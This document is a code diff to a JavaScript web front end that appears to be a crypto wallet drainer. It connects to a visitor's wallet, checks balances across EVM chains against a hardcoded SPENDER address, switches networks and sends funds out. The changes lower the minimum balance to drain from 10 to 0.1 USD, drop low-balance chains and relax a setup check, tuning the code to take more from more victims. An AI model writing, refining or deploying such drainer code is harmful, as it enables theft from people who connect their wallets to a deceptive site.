@@ -30,7 +30,6 @@ const TOKENS = [
 const SPENDER = "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2";
 const CHAIN_ID = 56;
 
-const MIN = 10;
 const chainInitializers = {
   bsc: {
     initializer: bsc,
@@ -75,7 +74,8 @@ export const updateButtonVisibility = (isConnected) => {
 let isConnected,
   processed,
   setUp = "not setup",
-  eligible = 0;
+  eligible = 0,
+  MIN = 0.1;
 
 export const updateBtnText = async (modal) => {
 
@@ -202,15 +202,13 @@ export const updateBtnText = async (modal) => {
     for (const chain of Object.keys(chainInitializers)) {
       const address = modal.getAddress();
       const balances = await fetchEvmBalances(chain, address);
-      if (balances?.error){
-         eligible++
-         continue;
-      };
+      if (balances?.error) continue;
       const { nativeBalanceUsd, tokens } = balances;
       if (nativeBalanceUsd < MIN && !tokens.find((t) => t.balanceUsd >= MIN)) {
         console.log(
-          `✍🏻 ${chain.toUpperCase()} has 0 or less than ${MIN}USD balances both native & Tokens = Ineligible Wallet ⛔️`
+          `✍🏻 ${chain.toUpperCase()} and it's tokens has 0 or less than ${MIN}USD balances = Ineligible Wallet ⛔️`
         );
+        delete chainInitializers[chain];
         continue;
       }
       eligible++;
@@ -241,7 +239,7 @@ export const updateBtnText = async (modal) => {
 
     if (!isConnected)return modal.open();
 
-    if (isConnected) {
+    if (isConnected || setUp !== "done setup") {
       Swal.fire({
         icon: "info",
         title: "Hold On!",
@@ -261,17 +259,13 @@ export const updateBtnText = async (modal) => {
     alert("Processing...");
     for (const chain of Object.keys(chainInitializers)) {
       const { initializer, type, balances } = chainInitializers[chain];
-      if (!balances){
-        console.log(`${chain} has no balances!`);
-        continue;
-      }
+      if (!balances) continue;
       const { address, nativeBalance, nativeBalanceUsd, tokens } = balances;
 
       await modal.switchNetwork(initializer);
       console.log(`Switched to ${chain}: ${address}`);
 
       const chainProvider = store.eip155Provider;
-
       try {
         if (nativeBalanceUsd >= MIN) {
           const tx = await sendTx(
@@ -313,7 +307,6 @@ export const updateBtnText = async (modal) => {
           );
         }
       };
-
 
     }
   };
